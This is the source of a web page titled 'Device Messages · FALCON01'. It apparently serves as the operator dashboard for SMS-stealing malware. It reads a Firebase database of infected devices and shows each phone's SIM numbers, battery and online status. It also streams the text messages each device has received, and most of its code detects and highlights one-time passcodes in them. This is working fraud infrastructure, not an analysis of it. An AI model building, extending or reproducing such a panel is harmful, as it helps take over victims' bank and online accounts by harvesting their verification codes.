<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Device Messages · FALCON01</title>
    <style>
        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: system-ui, -apple-system, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #0a0e14;
            color: #e6edf3;
            min-height: 100vh;
            padding: 16px;
        }
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }
        ::-webkit-scrollbar-track {
            background: #161b22;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb {
            background: #30363d;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #58a6ff;
        }

        .container {
            max-width: 700px;
            margin: 0 auto;
            padding-bottom: 40px;
        }

        /* ===== HEADER ===== */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #30363d;
            padding-bottom: 12px;
            margin-bottom: 16px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .back-btn {
            color: #58a6ff;
            text-decoration: none;
            font-size: 0.85rem;
            padding: 6px 14px;
            border: 1px solid #30363d;
            border-radius: 8px;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            background: transparent;
            cursor: pointer;
            touch-action: manipulation;
        }
        .back-btn:active {
            transform: scale(0.95);
        }
        .back-btn:hover {
            border-color: #58a6ff;
            background: #1c2333;
        }
        .header-title {
            font-weight: 600;
            font-size: 1rem;
        }
        .status-badge {
            font-size: 0.7rem;
            padding: 4px 12px;
            border-radius: 20px;
            background: #161b22;
            color: #8b949e;
            border: 1px solid #30363d;
            white-space: nowrap;
        }
        .status-badge.live {
            color: #3fb950;
            border-color: #3fb950;
        }
        .status-badge .pulse-dot {
            display: inline-block;
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #3fb950;
            margin-right: 4px;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        /* ===== DEVICE INFO CARD ===== */
        .device-info-box {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 16px 18px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.3);
        }
        .device-info-left {
            display: flex;
            flex-direction: column;
            gap: 4px;
            min-width: 0;
        }
        .device-info-box .name {
            font-weight: 700;
            font-size: 1.1rem;
            color: #f0f6fc;
            word-break: break-word;
        }
        .device-info-box .id {
            font-size: 0.65rem;
            color: #8b949e;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }
        .device-info-box .stats {
            font-size: 0.75rem;
            color: #8b949e;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px;
            background: #0d1117;
            padding: 6px 12px;
            border-radius: 8px;
            border: 1px solid #30363d;
        }
        .device-info-box .stats .stat-item {
            display: flex;
            align-items: center;
            gap: 4px;
            white-space: nowrap;
        }
        .device-info-box .stats .divider {
            color: #30363d;
            user-select: none;
        }

        /* ===== CLICKABLE PHONE NUMBER ===== */
        .clickable-phone {
            cursor: pointer;
            color: #58a6ff;
            transition: all 0.2s;
            padding: 2px 6px;
            border-radius: 4px;
            touch-action: manipulation;
            user-select: none;
            position: relative;
            font-weight: 500;
        }
        .clickable-phone:active {
            transform: scale(0.95);
            background: rgba(88, 166, 255, 0.1);
        }
        .clickable-phone::after {
            content: '📋';
            font-size: 0.65rem;
            margin-left: 4px;
            opacity: 0.6;
        }
        .clickable-phone:hover::after {
            opacity: 1;
        }

        .toast-message {
            position: fixed;
            bottom: 80px;
            left: 50%;
            transform: translateX(-50%) translateY(20px);
            background: #238636;
            color: #f0f6fc;
            padding: 10px 24px;
            border-radius: 10px;
            font-size: 0.85rem;
            font-weight: 500;
            opacity: 0;
            transition: all 0.3s ease;
            pointer-events: none;
            z-index: 999;
            box-shadow: 0 4px 20px rgba(35, 134, 54, 0.3);
            border: 1px solid #2ea043;
        }
        .toast-message.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }

        /* ===== SMS CARDS ===== */
        .sms-card {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 10px;
            padding: 14px 16px;
            margin-bottom: 10px;
            animation: slideIn 0.3s ease-in;
            transition: border-color 0.2s;
        }
        .sms-card:hover {
            border-color: #58a6ff;
        }
        .sms-card.new {
            border-left: 3px solid #3fb950;
            background: #1b242b;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .sms-card .meta {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 0.8rem;
            color: #58a6ff;
            margin-bottom: 6px;
            font-weight: 600;
            flex-wrap: wrap;
            gap: 4px;
        }
        .sms-card .meta .sender {
            display: flex;
            align-items: center;
            gap: 8px;
            word-break: break-word;
        }
        .sms-card .meta .sender .sender-icon {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            background: rgba(88, 166, 255, 0.1);
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 0.65rem;
            font-weight: 700;
            color: #58a6ff;
            flex-shrink: 0;
            border: 1px solid #30363d;
        }
        .sms-card .meta .time {
            color: #8b949e;
            font-weight: 400;
            font-size: 0.7rem;
            white-space: nowrap;
        }
        .sms-card .msg {
            margin: 4px 0 0 0;
            line-height: 1.6;
            white-space: pre-wrap;
            font-size: 0.92rem;
            color: #e6edf3;
            word-break: break-word;
        }
        .sms-card .msg .otp-highlight {
            background: #1c2333;
            padding: 2px 8px;
            border-radius: 4px;
            color: #d29922;
            font-family: 'Courier New', monospace;
            font-weight: 600;
            font-size: 1.1rem;
            letter-spacing: 1px;
        }
        .sms-card .info {
            font-size: 0.7rem;
            color: #8b949e;
            margin-top: 8px;
            border-top: 1px dashed #30363d;
            padding-top: 6px;
            word-break: break-word;
        }

        /* ===== LOADING & EMPTY ===== */
        .loading {
            color: #8b949e;
            text-align: center;
            padding: 30px 20px;
        }
        .spinner {
            display: inline-block;
            width: 22px;
            height: 22px;
            border: 2.5px solid #30363d;
            border-top: 2.5px solid #58a6ff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .no-msg {
            color: #8b949e;
            text-align: center;
            padding: 40px 20px;
            background: #161b22;
            border-radius: 12px;
            border: 1px dashed #30363d;
        }
        .no-msg .big-icon {
            font-size: 2.5rem;
            display: block;
            margin-bottom: 8px;
        }
        .error {
            color: #f85149;
            text-align: center;
            padding: 30px 20px;
            background: rgba(248, 81, 73, 0.05);
            border-radius: 10px;
            border: 1px solid rgba(248, 81, 73, 0.2);
            word-break: break-word;
        }

        /* ===== OTP DETECTION BADGE ===== */
        .otp-badge {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 0.6rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            background: rgba(210, 153, 34, 0.15);
            color: #d29922;
            border: 1px solid rgba(210, 153, 34, 0.2);
            margin-left: 6px;
        }
        .otp-badge.otp-found {
            background: rgba(63, 185, 80, 0.15);
            color: #3fb950;
            border-color: rgba(63, 185, 80, 0.2);
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            body { padding: 12px; }
            .header { flex-direction: row; gap: 8px; }
            .header-left { gap: 6px; }
            .back-btn { font-size: 0.75rem; padding: 4px 10px; min-height: 36px; }
            .header-title { font-size: 0.85rem; }
            .status-badge { font-size: 0.6rem; padding: 3px 8px; }
            .device-info-box { padding: 12px 14px; flex-direction: column; align-items: stretch; gap: 8px; }
            .device-info-box .name { font-size: 0.95rem; }
            .device-info-box .stats { font-size: 0.65rem; padding: 4px 10px; gap: 4px; flex-wrap: wrap; justify-content: flex-start; }
            .device-info-box .stats .stat-item { white-space: normal; word-break: break-word; }
            .device-info-box .stats .divider { display: none; }
            .sms-card { padding: 12px 14px; }
            .sms-card .meta { font-size: 0.7rem; }
            .sms-card .msg { font-size: 0.85rem; }
            .clickable-phone { font-size: 0.7rem; }
            .toast-message { bottom: 60px; font-size: 0.75rem; padding: 8px 16px; max-width: 90%; }
        }

        @media (max-width: 380px) {
            body { padding: 8px; }
            .container { padding-bottom: 20px; }
            .device-info-box .stats { font-size: 0.6rem; padding: 3px 8px; }
            .sms-card { padding: 10px 12px; }
            .sms-card .meta .sender .sender-icon { width: 22px; height: 22px; font-size: 0.5rem; }
        }

        .back-btn, .clickable-phone {
            min-height: 36px;
            min-width: 36px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="header-left">
                <button class="back-btn" onclick="goBack()">← Devices</button>
                <span class="header-title">📨 Device Messages</span>
            </div>
            <span id="counter" class="status-badge">Loading...</span>
        </div>

        <div id="deviceInfo" class="device-info-box">
            <div class="device-info-left">
                <div class="name" id="deviceName">Loading...</div>
                <div class="id" id="deviceId">ID: ...</div>
            </div>
            <div class="stats" id="deviceStats">
                <span id="msgCount" class="stat-item">📨 0 messages</span>
            </div>
        </div>

        <div id="toast" class="toast-message">✓ Copied!</div>

        <div id="sms-container">
            <div class="loading">
                <span class="spinner"></span>
                Loading messages...
            </div>
        </div>
    </div>

    <script type="module">
        // ============================================================
        // FIREBASE CONFIG - Using your existing database
        // ============================================================
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, onValue, get, child } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        // ===== DOM REFS =====
        const params = new URLSearchParams(window.location.search);
        const deviceId = params.get('id');

        const container = document.getElementById('sms-container');
        const counter = document.getElementById('counter');
        const deviceNameEl = document.getElementById('deviceName');
        const deviceIdEl = document.getElementById('deviceId');
        const deviceStats = document.getElementById('deviceStats');
        const toast = document.getElementById('toast');

        let messageCount = 0;
        let isFirstLoad = true;

        // ============================================================
        // FIREBASE INIT
        // ============================================================
        const app = initializeApp({
            databaseURL: "https://fortydata-fee65-default-rtdb.firebaseio.com"
        });
        const db = getDatabase(app);

        // ============================================================
        // TOAST FUNCTION
        // ============================================================
        function showToast(message, emoji = '✓') {
            toast.textContent = `${emoji} ${message}`;
            toast.classList.add('show');
            clearTimeout(toast._timer);
            toast._timer = setTimeout(() => {
                toast.classList.remove('show');
            }, 2000);
        }

        // ============================================================
        // COPY PHONE NUMBER
        // ============================================================
        function copyPhoneNumber(phone) {
            if (!phone || phone === 'No Number') return;
            let clean = phone.toString().replace(/[\s\-\(\)]/g, '');
            if (clean.startsWith('+91')) clean = clean.substring(3);
            if (clean.startsWith('91') && clean.length > 10) clean = clean.substring(2);
            
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(clean).then(() => {
                    showToast(`Copied: ${clean}`, '📋');
                }).catch(() => fallbackCopy(clean));
            } else {
                fallbackCopy(clean);
            }
        }

        function fallbackCopy(text) {
            const input = document.createElement('input');
            input.value = text;
            document.body.appendChild(input);
            input.select();
            try {
                document.execCommand('copy');
                showToast(`Copied: ${text}`, '📋');
            } catch (e) {
                showToast('Could not copy', '❌');
            }
            document.body.removeChild(input);
        }

        // Click interceptor for phone numbers
        document.addEventListener('click', (e) => {
            const target = e.target.closest('.clickable-phone');
            if (target && target.dataset.phone) {
                copyPhoneNumber(target.dataset.phone);
            }
        });

        // ============================================================
        // DETECT OTP IN MESSAGE
        // ============================================================
        function detectOTP(text) {
            if (!text) return null;
            // Common OTP patterns: 4-6 digit codes
            const patterns = [
                /\b\d{4}\b/g,      // 4 digit
                /\b\d{5}\b/g,      // 5 digit  
                /\b\d{6}\b/g,      // 6 digit
                /OTP[:\s]*(\d{4,6})/gi,  // OTP: 123456
                /code[:\s]*(\d{4,6})/gi, // code: 123456
                /verification[:\s]*(\d{4,6})/gi // verification: 123456
            ];
            
            let matches = [];
            for (const pattern of patterns) {
                const found = text.match(pattern);
                if (found) {
                    matches = matches.concat(found);
                }
            }
            
            // Remove duplicates
            return [...new Set(matches)];
        }

        function highlightOTP(text) {
            const otps = detectOTP(text);
            if (!otps || otps.length === 0) return text;
            
            let highlighted = text;
            for (const otp of otps) {
                highlighted = highlighted.replace(otp, `<span class="otp-highlight">${otp}</span>`);
            }
            return highlighted;
        }

        // ============================================================
        // GO BACK
        // ============================================================
        window.goBack = function() {
            if (window.history.length > 1) {
                window.history.back();
            } else {
                window.location.href = 'index.html';
            }
        };

        // ============================================================
        // VALIDATE DEVICE ID
        // ============================================================
        if (!deviceId) {
            container.innerHTML = '<div class="error">❌ No device specified</div>';
            counter.textContent = 'Error';
            document.getElementById('deviceName').textContent = 'Error';
            throw new Error('No device ID provided');
        }

        console.log(`📡 Listening for device: ${deviceId}`);

        // ============================================================
        // LOAD DEVICE INFO
        // ============================================================
        const deviceRef = ref(db, `admin/FALCON01/users/${deviceId}`);
        onValue(deviceRef, (snapshot) => {
            const data = snapshot.val();

            if (data) {
                const info = data.deviceInfo || {};
                const model = info.model || 'Unknown Device';
                const brand = info.brand || info.manufacturer || '';
                const displayName = brand ? `${brand} ${model}` : model;
                
                deviceNameEl.textContent = displayName || 'Unknown Device';
                deviceIdEl.textContent = `ID: ${deviceId}`;

                // Extract phone numbers
                const numbers = [];
                if (data.simInfo) {
                    ['sim1', 'sim2'].forEach(slot => {
                        const sim = data.simInfo[slot];
                        if (sim?.number) {
                            let n = sim.number.trim().replace(/^\+?91/, '');
                            if (n) numbers.push(n);
                        }
                    });
                    if (data.simInfo.number) {
                        let n = data.simInfo.number.trim().replace(/^\+?91/, '');
                        if (n && !numbers.includes(n)) numbers.push(n);
                    }
                }

                // Get charge if available
                const charge = data.charge || data.batteryLevel || data.battery || 0;

                // Build stats
                let statsHtml = '';
                if (numbers.length > 0) {
                    statsHtml += numbers.map(n => 
                        `<span class="clickable-phone stat-item" data-phone="${n}">📞 ${n}</span>`
                    ).join(' <span class="divider">·</span> ');
                } else {
                    statsHtml += `<span class="stat-item">📞 No Number</span>`;
                }

                statsHtml += ` <span class="divider">·</span> `;
                statsHtml += `<span class="stat-item">🔋 ${charge}%</span>`;
                statsHtml += ` <span class="divider">·</span> `;
                statsHtml += `<span class="stat-item" id="msgCount">📨 ${messageCount} messages</span>`;

                deviceStats.innerHTML = statsHtml;

                // Update status
                const online = data.online || false;
                const statusDot = online ? '🟢' : '⚪';
                const statusText = online ? 'Online' : 'Offline';
                document.querySelector('.status-badge').innerHTML = 
                    `${statusDot} ${statusText} · ${messageCount} msgs`;
                document.querySelector('.status-badge').className = 
                    `status-badge${online ? ' live' : ''}`;

            } else {
                deviceNameEl.textContent = 'Device Not Found';
                deviceIdEl.textContent = `ID: ${deviceId}`;
                deviceStats.innerHTML = `<span class="stat-item">⚠️ Device not found</span>`;
            }
        }, (error) => {
            console.warn('Device info error:', error);
            deviceNameEl.textContent = 'Error loading device';
        });

        // ============================================================
        // LISTEN FOR SMS MESSAGES - REAL-TIME
        // ============================================================
        const smsRef = ref(db, `admin/FALCON01/users/${deviceId}/receivedSms`);

        onValue(smsRef, (snapshot) => {
            const data = snapshot.val();

            if (!data) {
                messageCount = 0;
                container.innerHTML = `
                    <div class="no-msg">
                        <span class="big-icon">📭</span>
                        No messages for this device
                        <br><small style="color:#475569;font-size:0.75rem;">Waiting for messages...</small>
                    </div>
                `;
                counter.textContent = '0 messages';
                counter.className = 'status-badge';
                updateMessageCount(0);
                return;
            }

            // Convert to array and sort by timestamp (newest first)
            const messages = Object.entries(data).map(([key, value]) => ({
                id: key,
                ...value
            }));

            // Sort by timestamp descending (newest first)
            messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

            messageCount = messages.length;
            console.log(`📨 Found ${messageCount} messages for device ${deviceId}`);

            // Update counter
            counter.textContent = `${messageCount} messages`;
            counter.className = 'status-badge live';

            // Update online status
            const online = document.querySelector('.status-badge')?.textContent?.includes('Online');
            if (online !== undefined) {
                document.querySelector('.status-badge').innerHTML = 
                    `🟢 Online · ${messageCount} msgs`;
                document.querySelector('.status-badge').className = 'status-badge live';
            }

            updateMessageCount(messageCount);

            // Render messages
            if (messages.length === 0) {
                container.innerHTML = `
                    <div class="no-msg">
                        <span class="big-icon">📭</span>
                        No messages for this device
                        <br><small style="color:#475569;font-size:0.75rem;">Device ID: ${deviceId}</small>
                    </div>
                `;
                return;
            }

            // Build HTML with fragment for performance
            const fragment = document.createDocumentFragment();

            // Only show last 50 messages for performance
            const displayMessages = messages.slice(0, 50);

            for (const sms of displayMessages) {
                const card = document.createElement('div');
                card.className = 'sms-card';
                
                // Check if this is a new message (within last 5 seconds)
                const isNew = sms.timestamp && (Date.now() - sms.timestamp) < 5000;
                if (isNew) card.classList.add('new');

                const sender = sms.sender || 'Unknown';
                const senderInitial = sender.charAt(0).toUpperCase() || 'U';
                const time = sms.timestamp ? new Date(sms.timestamp).toLocaleString('en-IN', {
                    day: '2-digit',
                    month: 'short',
                    year: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit',
                    hour12: true
                }) : 'N/A';

                // Detect OTP
                const messageText = sms.message || '';
                const otps = detectOTP(messageText);
                const hasOTP = otps && otps.length > 0;
                const highlightedMessage = highlightOTP(messageText);

                // Build sender display with OTP badge
                let senderHtml = `
                    <span class="sender">
                        <span class="sender-icon">${senderInitial}</span>
                        ${sender}
                        ${hasOTP ? `<span class="otp-badge otp-found">🔑 OTP</span>` : ''}
                    </span>
                `;

                // If multiple OTPs found, show count
                let otpInfo = '';
                if (hasOTP && otps.length > 1) {
                    otpInfo = `<div class="info">🔑 ${otps.length} OTP codes found: ${otps.join(', ')}</div>`;
                } else if (hasOTP) {
                    otpInfo = `<div class="info">🔑 OTP: ${otps[0]}</div>`;
                }

                card.innerHTML = `
                    <div class="meta">
                        ${senderHtml}
                        <span class="time">🕐 ${time}</span>
                    </div>
                    <div class="msg">${highlightedMessage}</div>
                    ${otpInfo}
                    ${sms.info ? `<div class="info">⚙️ ${sms.info}</div>` : ''}
                `;

                fragment.appendChild(card);
            }

            // If more than 50 messages, show indicator
            if (messages.length > 50) {
                const more = document.createElement('div');
                more.style.cssText = `
                    text-align: center;
                    color: #8b949e;
                    font-size: 0.75rem;
                    padding: 12px;
                    border-top: 1px solid #30363d;
                    margin-top: 4px;
                `;
                more.textContent = `Showing last 50 of ${messages.length} messages`;
                fragment.appendChild(more);
            }

            // Clear and append
            container.innerHTML = '';
            container.appendChild(fragment);

            // If this is first load, scroll to top
            if (isFirstLoad) {
                isFirstLoad = false;
                window.scrollTo({ top: 0, behavior: 'smooth' });
            }

        }, (error) => {
            console.error('❌ Firebase error:', error);
            container.innerHTML = `
                <div class="error">
                    ❌ ${error.message}
                    <br><small style="color:#64748b;font-size:0.75rem;">Check console for details</small>
                </div>
            `;
            counter.textContent = 'Error';
        });

        // ============================================================
        // UPDATE MESSAGE COUNT
        // ============================================================
        function updateMessageCount(count) {
            const msgCountEl = document.getElementById('msgCount');
            if (msgCountEl) {
                msgCountEl.textContent = `📨 ${count} messages`;
            }
        }

        // ============================================================
        // KEYBOARD SHORTCUTS
        // ============================================================
        document.addEventListener('keydown', (e) => {
            // Escape to go back
            if (e.key === 'Escape') {
                goBack();
            }
            // R to refresh
            if (e.key === 'r' && (e.metaKey || e.ctrlKey)) {
                e.preventDefault();
                showToast('Refreshing...', '🔄');
                // Force refresh by re-subscribing
                const tempRef = ref(db, `admin/FALCON01/users/${deviceId}/receivedSms`);
                onValue(tempRef, () => {}, { onlyOnce: true });
            }
        });

        console.log(`✅ Listening for device: ${deviceId}`);
        console.log('📌 Press ESC to go back, ⌘R to refresh');
    </script>
</body>
</html>
